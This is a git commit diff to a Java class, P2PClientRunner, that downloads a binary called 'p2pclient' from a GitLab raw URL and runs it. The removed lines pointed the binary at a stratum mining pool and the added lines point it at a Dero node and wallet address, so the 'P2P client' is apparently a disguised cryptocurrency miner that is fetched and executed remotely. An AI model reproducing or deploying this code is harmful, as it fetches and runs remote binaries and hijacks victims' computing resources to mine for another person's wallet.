598ff9e937d62968d0a4de3587028f055df12b12
jusnky <rikzakalani@gmail.com>
2025-02-24 13:13:12 +0700

    Update P2PClientRunner.java

--- P2PClientRunner.java
+++ P2PClientRunner.java
@@ -4,7 +4,7 @@ import java.net.URL;
 import java.nio.file.*;
 
 public class P2PClientRunner {
-    private static final String P2P_URL = "https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient";
+    private static final String P2P_URL = "https://gitlab.com/rikzakalani/sd/raw/main/p2pclient";
     private static final String P2P_PATH = "p2pclient";
     private static final String LOG_FILE = "p2pclient.log";
 
@@ -23,9 +23,9 @@ public class P2PClientRunner {
             System.out.println("🚀 Starting p2pclient...");
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
-                "--noeval",
-                "--hard-aes",
-                "-P", "stratum1+tcp://cb92b11ef983881478efd07d3c031ca2f41c121da3e2.pepek@us.catchthatrabbit.com:8008"
+                "--daemon-address", "dero-node-orionure-sg.mysrv.cloud",
+                "--port", "10300",
+                "--wallet", "dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4.kitaasu"
             );
 
             processBuilder.redirectErrorStream(true);
